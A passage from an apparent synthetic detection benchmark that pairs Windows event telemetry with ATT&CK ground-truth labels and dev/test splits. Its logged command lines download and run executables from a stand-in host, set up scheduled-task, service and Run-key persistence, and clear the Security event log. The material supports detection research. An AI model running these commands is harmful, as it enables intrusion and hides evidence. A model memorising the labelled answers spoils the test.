  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_526bfb76"
}
```

## pair_98c990f1
Family: TF_AMBIG_DEV; split: dev
Transition: ambiguous -> ambiguous
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WORKSTATION01",
    "event_id": "evt_a3d91196",
    "event_record_id": 239922946000,
    "fields": {
      "Computer": "WORKSTATION01",
      "EventID": 4697,
      "ServiceAccount": "LocalSystem",
      "ServiceFileName": "C:\\ProgramData\\oak_larch_cedar_98c990\\agent.exe",
      "ServiceName": "Telemetry_oak_larch_cedar_98c990",
      "ServiceStartType": "3",
      "ServiceType": "0x10",
      "SubjectDomainName": "WORKSTATION01",
      "SubjectLogonId": "0x4359",
      "SubjectUserName": "mchen",
      "TimeCreated": "2026-06-26T19:55:13Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-06-26T19:55:13Z",
    "windows_event_id": 4697
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "WORKSTATION01",
    "EventID": 4697,
    "ServiceAccount": "LocalSystem",
    "ServiceFileName": "C:\\ProgramData\\oak_larch_cedar_98c990\\agent.exe",
    "ServiceName": "Telemetry_oak_larch_cedar_98c990",
    "ServiceStartType": "3",
    "ServiceType": "0x10",
    "SubjectDomainName": "WORKSTATION01",
    "SubjectLogonId": "0x4359",
    "SubjectUserName": "mchen",
    "TimeCreated": "2026-06-26T19:55:13Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_AMBIG_DEV/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_a3d91196",
        "fields": [
          "ServiceFileName",
          "ServiceStartType"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "A ProgramData service with demand start is observable but lacks signer, creator, and execution context needed for attribution.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_914cd70c"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WORKSTATION01",
    "event_id": "evt_a3d91196",
    "event_record_id": 239922946000,
    "fields": {
      "Computer": "WORKSTATION01",
      "EventID": 4697,
      "ServiceAccount": "LocalSystem",
      "ServiceFileName": "C:\\ProgramData\\oak_larch_cedar_98c990\\agent.exe",
      "ServiceName": "Telemetry_oak_larch_cedar_98c990",
      "ServiceStartType": "3",
      "ServiceType": "0x10",
      "SubjectDomainName": "WORKSTATION01",
      "SubjectLogonId": "0x4359",
      "SubjectUserName": "mchen",
      "TimeCreated": "2026-06-26T19:55:13Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-06-26T19:55:13Z",
    "windows_event_id": 4697
  },
  {
    "channel": "Security",
    "computer": "WORKSTATION01",
    "event_id": "evt_09687afd",
    "event_record_id": 92184930233426,
    "fields": {
      "Computer": "WORKSTATION01",
      "EventID": 4697,
      "ServiceAccount": "LocalSystem",
      "ServiceFileName": "C:\\ProgramData\\oak_larch_cedar_98c990\\agent.exe",
      "ServiceName": "TelemetryNext_oak_larch_cedar_98c990",
      "ServiceStartType": "3",
      "ServiceType": "0x10",
      "SubjectDomainName": "WORKSTATION01",
      "SubjectLogonId": "0x4359",
      "SubjectUserName": "mchen",
      "TimeCreated": "2026-06-26T19:55:16Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-06-26T19:55:16Z",
    "windows_event_id": 4697
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "WORKSTATION01",
    "EventID": 4697,
    "ServiceAccount": "LocalSystem",
    "ServiceFileName": "C:\\ProgramData\\oak_larch_cedar_98c990\\agent.exe",
    "ServiceName": "Telemetry_oak_larch_cedar_98c990",
    "ServiceStartType": "3",
    "ServiceType": "0x10",
    "SubjectDomainName": "WORKSTATION01",
    "SubjectLogonId": "0x4359",
    "SubjectUserName": "mchen",
    "TimeCreated": "2026-06-26T19:55:13Z"
  },
  {
    "Computer": "WORKSTATION01",
    "EventID": 4697,
    "ServiceAccount": "LocalSystem",
    "ServiceFileName": "C:\\ProgramData\\oak_larch_cedar_98c990\\agent.exe",
    "ServiceName": "TelemetryNext_oak_larch_cedar_98c990",
    "ServiceStartType": "3",
    "ServiceType": "0x10",
    "SubjectDomainName": "WORKSTATION01",
    "SubjectLogonId": "0x4359",
    "SubjectUserName": "mchen",
    "TimeCreated": "2026-06-26T19:55:16Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_AMBIG_DEV/contextual",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_a3d91196",
        "fields": [
          "Computer",
          "ServiceFileName"
        ]
      },
      {
        "event_id": "evt_09687afd",
        "fields": [
          "Computer",
          "ServiceName"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "The related service metadata remains dual-use and does not resolve to mapped or affirmative benign evidence.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_44416e51"
}
```

## pair_2cb04afe
Family: TF_MULTI_A; split: test
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "FILESVR01",
    "event_id": "evt_135003db",
    "event_record_id": 79489310466526,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command \"Invoke-WebRequest https://files.example.invalid/pine_cedar_spruce_2cb04a/package.exe -OutFile C:\\ProgramData\\pine_cedar_spruce_2cb04a\\agent.exe; Register-ScheduledTask -TaskName CacheRefresh_pine_cedar_spruce_2cb04a -Action (New-ScheduledTaskAction -Execute C:\\ProgramData\\pine_cedar_spruce_2cb04a\\agent.exe)\"",
      "Computer": "FILESVR01",
      "EventID": 1,
      "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "LogonGuid": "{97ea8ac7-d8a0-982a-a72f-7632d5f08198}",
      "LogonId": "0x1102d",
      "ParentCommandLine": "C:\\Windows\\explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentProcessGuid": "{674a2ce5-05f1-28fb-ea67-7de3d54fe53d}",
      "ParentProcessId": 69672,
      "ProcessGuid": "{484b8c1d-21de-e398-569f-c6c5eb6b12c5}",
      "ProcessId": 69676,
      "User": "mchen",
      "UtcTime": "2026-02-22T01:19:02Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-02-22T01:19:02Z",
    "windows_event_id": 1
  }
]
```

### single: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command \"Invoke-WebRequest https://files.example.invalid/pine_cedar_spruce_2cb04a/package.exe -OutFile C:\\ProgramData\\pine_cedar_spruce_2cb04a\\agent.exe; Register-ScheduledTask -TaskName CacheRefresh_pine_cedar_spruce_2cb04a -Action (New-ScheduledTaskAction -Execute C:\\ProgramData\\pine_cedar_spruce_2cb04a\\agent.exe)\"",
    "Computer": "FILESVR01",
    "EventID": 1,
    "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "LogonGuid": "{97ea8ac7-d8a0-982a-a72f-7632d5f08198}",
    "LogonId": "0x1102d",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentProcessGuid": "{674a2ce5-05f1-28fb-ea67-7de3d54fe53d}",
    "ParentProcessId": 69672,
    "ProcessGuid": "{484b8c1d-21de-e398-569f-c6c5eb6b12c5}",
    "ProcessId": 69676,
    "User": "mchen",
    "UtcTime": "2026-02-22T01:19:02Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_MULTI_A/single",
  "evidence_refs": {
    "T1059.001": [
      {
        "event_id": "evt_135003db",
        "fields": [
          "CommandLine",
          "Image"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The single view independently supports PowerShell execution; the download and task behaviors are contextual.",
  "technique_ids": [
    "T1059.001"
  ],
  "technique_names": [
    "PowerShell"
  ],
  "view_id": "view_8ed76bb5"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "FILESVR01",
    "event_id": "evt_135003db",
    "event_record_id": 79489310466526,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command \"Invoke-WebRequest https://files.example.invalid/pine_cedar_spruce_2cb04a/package.exe -OutFile C:\\ProgramData\\pine_cedar_spruce_2cb04a\\agent.exe; Register-ScheduledTask -TaskName CacheRefresh_pine_cedar_spruce_2cb04a -Action (New-ScheduledTaskAction -Execute C:\\ProgramData\\pine_cedar_spruce_2cb04a\\agent.exe)\"",
      "Computer": "FILESVR01",
      "EventID": 1,
      "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "LogonGuid": "{97ea8ac7-d8a0-982a-a72f-7632d5f08198}",
      "LogonId": "0x1102d",
      "ParentCommandLine": "C:\\Windows\\explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentProcessGuid": "{674a2ce5-05f1-28fb-ea67-7de3d54fe53d}",
      "ParentProcessId": 69672,
      "ProcessGuid": "{484b8c1d-21de-e398-569f-c6c5eb6b12c5}",
      "ProcessId": 69676,
      "User": "mchen",
      "UtcTime": "2026-02-22T01:19:02Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-02-22T01:19:02Z",
    "windows_event_id": 1
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "FILESVR01",
    "event_id": "evt_6e89c7ed",
    "event_record_id": 224125193968141,
    "fields": {
      "Computer": "FILESVR01",
      "EventID": 11,
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "ProcessGuid": "{484b8c1d-21de-e398-569f-c6c5eb6b12c5}",
      "ProcessId": 69676,
      "TargetFilename": "C:\\ProgramData\\pine_cedar_spruce_2cb04a\\agent.exe",
      "User": "mchen",
      "UtcTime": "2026-02-22T01:19:05Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-02-22T01:19:05Z",
    "windows_event_id": 11
  },
  {
    "channel": "Security",
    "computer": "FILESVR01",
    "event_id": "evt_bb56ff82",
    "event_record_id": 241040144527635,
    "fields": {
      "Computer": "FILESVR01",
      "EventID": 4698,
      "SubjectLogonId": "0x1102d",
      "SubjectUserName": "mchen",
      "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\ProgramData\\pine_cedar_spruce_2cb04a\\agent.exe</Command><Arguments></Arguments></Exec></Actions></Task>",
      "TaskName": "\\CacheRefresh_pine_cedar_spruce_2cb04a",
      "TimeCreated": "2026-02-22T01:19:08Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-02-22T01:19:08Z",
    "windows_event_id": 4698
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command \"Invoke-WebRequest https://files.example.invalid/pine_cedar_spruce_2cb04a/package.exe -OutFile C:\\ProgramData\\pine_cedar_spruce_2cb04a\\agent.exe; Register-ScheduledTask -TaskName CacheRefresh_pine_cedar_spruce_2cb04a -Action (New-ScheduledTaskAction -Execute C:\\ProgramData\\pine_cedar_spruce_2cb04a\\agent.exe)\"",
    "Computer": "FILESVR01",
    "EventID": 1,
    "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "LogonGuid": "{97ea8ac7-d8a0-982a-a72f-7632d5f08198}",
    "LogonId": "0x1102d",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentProcessGuid": "{674a2ce5-05f1-28fb-ea67-7de3d54fe53d}",
    "ParentProcessId": 69672,
    "ProcessGuid": "{484b8c1d-21de-e398-569f-c6c5eb6b12c5}",
    "ProcessId": 69676,
    "User": "mchen",
    "UtcTime": "2026-02-22T01:19:02Z"
  },
  {
    "Computer": "FILESVR01",
    "EventID": 11,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ProcessGuid": "{484b8c1d-21de-e398-569f-c6c5eb6b12c5}",
    "ProcessId": 69676,
    "TargetFilename": "C:\\ProgramData\\pine_cedar_spruce_2cb04a\\agent.exe",
    "User": "mchen",
    "UtcTime": "2026-02-22T01:19:05Z"
  },
  {
    "Computer": "FILESVR01",
    "EventID": 4698,
    "SubjectLogonId": "0x1102d",
    "SubjectUserName": "mchen",
    "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\ProgramData\\pine_cedar_spruce_2cb04a\\agent.exe</Command><Arguments></Arguments></Exec></Actions></Task>",
    "TaskName": "\\CacheRefresh_pine_cedar_spruce_2cb04a",
    "TimeCreated": "2026-02-22T01:19:08Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_MULTI_A/contextual",
  "evidence_refs": {
    "T1053.005": [
      {
        "event_id": "evt_135003db",
        "fields": [
          "Computer",
          "User",
          "UtcTime"
        ]
      },
      {
        "event_id": "evt_bb56ff82",
        "fields": [
          "Computer",
          "SubjectUserName",
          "TaskContent",
          "TaskName",
          "TimeCreated"
        ]
      }
    ],
    "T1059.001": [
      {
        "event_id": "evt_135003db",
        "fields": [
          "CommandLine",
          "Image"
        ]
      }
    ],
    "T1105": [
      {
        "event_id": "evt_135003db",
        "fields": [
          "CommandLine",
          "Computer",
          "ProcessGuid",
          "UtcTime"
        ]
      },
      {
        "event_id": "evt_6e89c7ed",
        "fields": [
          "Computer",
          "ProcessGuid",
          "TargetFilename",
          "UtcTime"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "Each contextual label has separate evidence: PowerShell syntax, a downloaded file, and a scheduled-task object.",
  "technique_ids": [
    "T1059.001",
    "T1105",
    "T1053.005"
  ],
  "technique_names": [
    "PowerShell",
    "Ingress Tool Transfer",
    "Scheduled Task"
  ],
  "view_id": "view_70f645aa"
}
```

## pair_0c0da17f
Family: TF_MULTI_B; split: test
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WORKSTATION02",
    "event_id": "evt_afa43299",
    "event_record_id": 234262961200272,
    "fields": {
      "Computer": "WORKSTATION02",
      "EventID": 4697,
      "ServiceAccount": "LocalSystem",
      "ServiceFileName": "C:\\Users\\Public\\holly_beech_willow_0c0da1\\agent.exe",
      "ServiceName": "Update_holly_beech_willow_0c0da1",
      "ServiceStartType": "2",
      "ServiceType": "0x10",
      "SubjectDomainName": "WORKSTATION02",
      "SubjectLogonId": "0x921d",
      "SubjectUserName": "admin.svc",
      "TimeCreated": "2026-05-13T21:06:55Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-05-13T21:06:55Z",
    "windows_event_id": 4697
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "WORKSTATION02",
    "EventID": 4697,
    "ServiceAccount": "LocalSystem",
    "ServiceFileName": "C:\\Users\\Public\\holly_beech_willow_0c0da1\\agent.exe",
    "ServiceName": "Update_holly_beech_willow_0c0da1",
    "ServiceStartType": "2",
    "ServiceType": "0x10",
    "SubjectDomainName": "WORKSTATION02",
    "SubjectLogonId": "0x921d",
    "SubjectUserName": "admin.svc",
    "TimeCreated": "2026-05-13T21:06:55Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_MULTI_B/single",
  "evidence_refs": {
    "T1543.003": [
      {
        "event_id": "evt_afa43299",
        "fields": [
          "ServiceAccount",
          "ServiceFileName"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The single service-install event independently supports Windows Service.",
  "technique_ids": [
    "T1543.003"
  ],
  "technique_names": [
    "Windows Service"
  ],
  "view_id": "view_e07cd9fa"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WORKSTATION02",
    "event_id": "evt_596840af",
    "event_record_id": 273987329903453,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /c sc create Update_holly_beech_willow_0c0da1 binPath= C:\\Users\\Public\\holly_beech_willow_0c0da1\\agent.exe && wevtutil cl Security /bu:C:\\ProgramData\\holly_beech_willow_0c0da1\\audit.evtx",
      "Computer": "WORKSTATION02",
      "EventID": 4688,
      "NewProcessId": "0x9220",
      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessName": "C:\\Windows\\explorer.exe",
      "ProcessId": "0x9218",
      "SubjectLogonId": "0x921d",
      "SubjectUserName": "admin.svc",
      "TargetUserName": "admin.svc",
      "TimeCreated": "2026-05-13T21:06:52Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-05-13T21:06:52Z",
    "windows_event_id": 4688
  },
  {
    "channel": "Security",
    "computer": "WORKSTATION02",
    "event_id": "evt_afa43299",
    "event_record_id": 234262961200272,
    "fields": {
      "Computer": "WORKSTATION02",
      "EventID": 4697,
      "ServiceAccount": "LocalSystem",
      "ServiceFileName": "C:\\Users\\Public\\holly_beech_willow_0c0da1\\agent.exe",
      "ServiceName": "Update_holly_beech_willow_0c0da1",
      "ServiceStartType": "2",
      "ServiceType": "0x10",
      "SubjectDomainName": "WORKSTATION02",
      "SubjectLogonId": "0x921d",
      "SubjectUserName": "admin.svc",
      "TimeCreated": "2026-05-13T21:06:55Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-05-13T21:06:55Z",
    "windows_event_id": 4697
  },
  {
    "channel": "Security",
    "computer": "WORKSTATION02",
    "event_id": "evt_f6ec1540",
    "event_record_id": 85658957779615,
    "fields": {
      "Computer": "WORKSTATION02",
      "EventID": 1102,
      "SubjectLogonId": "0x921d",
      "SubjectUserName": "admin.svc",
      "TimeCreated": "2026-05-13T21:06:58Z"
    },
    "provider": "Microsoft-Windows-Eventlog",
    "timestamp_utc": "2026-05-13T21:06:58Z",
    "windows_event_id": 1102
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\cmd.exe /c sc create Update_holly_beech_willow_0c0da1 binPath= C:\\Users\\Public\\holly_beech_willow_0c0da1\\agent.exe && wevtutil cl Security /bu:C:\\ProgramData\\holly_beech_willow_0c0da1\\audit.evtx",
    "Computer": "WORKSTATION02",
    "EventID": 4688,
    "NewProcessId": "0x9220",
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "ProcessId": "0x9218",
    "SubjectLogonId": "0x921d",
    "SubjectUserName": "admin.svc",
    "TargetUserName": "admin.svc",
    "TimeCreated": "2026-05-13T21:06:52Z"
  },
  {
    "Computer": "WORKSTATION02",
    "EventID": 4697,
    "ServiceAccount": "LocalSystem",
    "ServiceFileName": "C:\\Users\\Public\\holly_beech_willow_0c0da1\\agent.exe",
    "ServiceName": "Update_holly_beech_willow_0c0da1",
    "ServiceStartType": "2",
    "ServiceType": "0x10",
    "SubjectDomainName": "WORKSTATION02",
    "SubjectLogonId": "0x921d",
    "SubjectUserName": "admin.svc",
    "TimeCreated": "2026-05-13T21:06:55Z"
  },
  {
    "Computer": "WORKSTATION02",
    "EventID": 1102,
    "SubjectLogonId": "0x921d",
    "SubjectUserName": "admin.svc",
    "TimeCreated": "2026-05-13T21:06:58Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_MULTI_B/contextual",
  "evidence_refs": {
    "T1543.003": [
      {
        "event_id": "evt_afa43299",
        "fields": [
          "Computer",
          "ServiceAccount",
          "ServiceFileName",
          "SubjectUserName",
          "TimeCreated"
        ]
      },
      {
        "event_id": "evt_596840af",
        "fields": [
          "Computer",
          "SubjectUserName",
          "TimeCreated"
        ]
      }
    ],
    "T1685.005": [
      {
        "event_id": "evt_596840af",
        "fields": [
          "CommandLine",
          "Computer",
          "SubjectLogonId",
          "TimeCreated"
        ]
      },
      {
        "event_id": "evt_f6ec1540",
        "fields": [
          "Computer",
          "EventID",
          "SubjectLogonId",
          "TimeCreated"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "Service evidence and log-clear evidence are independently visible in the contextual view.",
  "technique_ids": [
    "T1543.003",
    "T1685.005"
  ],
  "technique_names": [
    "Windows Service",
    "Clear Windows Event Logs"
  ],
  "view_id": "view_72d3654e"
}
```

## pair_03d2f7b7
Family: TF_MULTI_C; split: test
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "DB01",
    "event_id": "evt_0c3320c8",
    "event_record_id": 61515592991288,
    "fields": {
      "Computer": "DB01",
      "EventID": 4720,
      "SubjectLogonId": "0xe3ed",
      "SubjectUserName": "tjones",
      "TargetUserName": "svc_03d2f7",
      "TimeCreated": "2026-02-17T21:16:47Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-02-17T21:16:47Z",
    "windows_event_id": 4720
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "DB01",
    "EventID": 4720,
    "SubjectLogonId": "0xe3ed",
    "SubjectUserName": "tjones",
    "TargetUserName": "svc_03d2f7",
    "TimeCreated": "2026-02-17T21:16:47Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_MULTI_C/single",
  "evidence_refs": {
    "T1136.001": [
      {
        "event_id": "evt_0c3320c8",
        "fields": [
          "SubjectUserName",
          "TargetUserName"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The single view supports local-account creation but does not yet show the persistence behavior.",
  "technique_ids": [
    "T1136.001"
  ],
  "technique_names": [
    "Local Account"
  ],
  "view_id": "view_a19c66b3"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "DB01",
    "event_id": "evt_0c3320c8",
    "event_record_id": 61515592991288,
    "fields": {
      "Computer": "DB01",
      "EventID": 4720,
      "SubjectLogonId": "0xe3ed",
      "SubjectUserName": "tjones",
      "TargetUserName": "svc_03d2f7",
      "TimeCreated": "2026-02-17T21:16:47Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-02-17T21:16:47Z",
    "windows_event_id": 4720
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "DB01",
    "event_id": "evt_b714dbe2",
    "event_record_id": 71710409264013,
    "fields": {
      "Computer": "DB01",
      "Details": "C:\\Users\\svc_03d2f7\\AppData\\Local\\agent.exe",
      "EventID": 13,
      "EventType": "SetValue",
      "Image": "C:\\Windows\\System32\\reg.exe",
      "ProcessGuid": "{41386178-8b8d-0b92-a1d3-acfae5df7798}",
      "ProcessId": 58352,
      "TargetObject": "HKU\\S-1-5-21-111111111-222222222-333333333-56799\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\alder_spruce_holly_03d2f7",
      "User": "tjones",
      "UtcTime": "2026-02-17T21:16:50Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-02-17T21:16:50Z",
    "windows_event_id": 13
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "DB01",
    "EventID": 4720,
    "SubjectLogonId": "0xe3ed",
    "SubjectUserName": "tjones",
    "TargetUserName": "svc_03d2f7",
    "TimeCreated": "2026-02-17T21:16:47Z"
  },
  {
    "Computer": "DB01",
    "Details": "C:\\Users\\svc_03d2f7\\AppData\\Local\\agent.exe",
    "EventID": 13,
    "EventType": "SetValue",
    "Image": "C:\\Windows\\System32\\reg.exe",
    "ProcessGuid": "{41386178-8b8d-0b92-a1d3-acfae5df7798}",
    "ProcessId": 58352,
    "TargetObject": "HKU\\S-1-5-21-111111111-222222222-333333333-56799\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\alder_spruce_holly_03d2f7",
    "User": "tjones",
    "UtcTime": "2026-02-17T21:16:50Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_MULTI_C/contextual",
  "evidence_refs": {
    "T1136.001": [
      {
        "event_id": "evt_0c3320c8",
        "fields": [
          "SubjectUserName",
          "TargetUserName"
        ]
      },
      {
        "event_id": "evt_b714dbe2",
        "fields": [
          "User"
        ]
      }
    ],
    "T1547.001": [
      {
        "event_id": "evt_0c3320c8",
        "fields": [
          "Computer",
          "SubjectUserName",
          "TimeCreated"
        ]
      },
      {
        "event_id": "evt_b714dbe2",
        "fields": [
          "Computer",
          "Details",
          "TargetObject",
          "User",
          "UtcTime"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The account event and Run-key mutation have separate predicates, supporting the two contextual techniques.",
  "technique_ids": [
    "T1136.001",
    "T1547.001"
  ],
  "technique_names": [
    "Local Account",
    "Registry Run Keys / Startup Folder"
  ],
  "view_id": "view_c9de2a4e"
}
```

## pair_20c67c7d
Family: TF_MULTI_D; split: test
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WEB01",
    "event_id": "evt_61e1b572",
    "event_record_id": 79637681314325,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /c curl https://files.example.invalid/cedar_aspen_willow_20c67c/package.exe -o C:\\ProgramData\\cedar_aspen_willow_20c67c\\agent.exe && C:\\ProgramData\\cedar_aspen_willow_20c67c\\agent.exe",
      "Computer": "WEB01",
      "EventID": 4688,
      "NewProcessId": "0x2c1c",
      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessName": "C:\\Windows\\explorer.exe",
      "ProcessId": "0x2c18",
      "SubjectLogonId": "0x2c1d",
      "SubjectUserName": "mchen",
      "TargetUserName": "mchen",
      "TimeCreated": "2026-06-15T06:39:26Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-06-15T06:39:26Z",
    "windows_event_id": 4688
  }
]
```

### single: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\cmd.exe /c curl https://files.example.invalid/cedar_aspen_willow_20c67c/package.exe -o C:\\ProgramData\\cedar_aspen_willow_20c67c\\agent.exe && C:\\ProgramData\\cedar_aspen_willow_20c67c\\agent.exe",
    "Computer": "WEB01",
    "EventID": 4688,
    "NewProcessId": "0x2c1c",
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "ProcessId": "0x2c18",
    "SubjectLogonId": "0x2c1d",
    "SubjectUserName": "mchen",
    "TargetUserName": "mchen",
    "TimeCreated": "2026-06-15T06:39:26Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_MULTI_D/single",
  "evidence_refs": {
    "T1059.003": [
      {
        "event_id": "evt_61e1b572",
        "fields": [
          "CommandLine",
          "NewProcessName"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The single view independently supports Windows Command Shell execution.",
  "technique_ids": [
    "T1059.003"
  ],
  "technique_names": [
    "Windows Command Shell"
  ],
  "view_id": "view_5da635dd"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WEB01",
    "event_id": "evt_61e1b572",
    "event_record_id": 79637681314325,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /c curl https://files.example.invalid/cedar_aspen_willow_20c67c/package.exe -o C:\\ProgramData\\cedar_aspen_willow_20c67c\\agent.exe && C:\\ProgramData\\cedar_aspen_willow_20c67c\\agent.exe",
      "Computer": "WEB01",
      "EventID": 4688,
      "NewProcessId": "0x2c1c",
      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessName": "C:\\Windows\\explorer.exe",
      "ProcessId": "0x2c18",
      "SubjectLogonId": "0x2c1d",
      "SubjectUserName": "mchen",
      "TargetUserName": "mchen",
      "TimeCreated": "2026-06-15T06:39:26Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-06-15T06:39:26Z",
    "windows_event_id": 4688
  },
  {
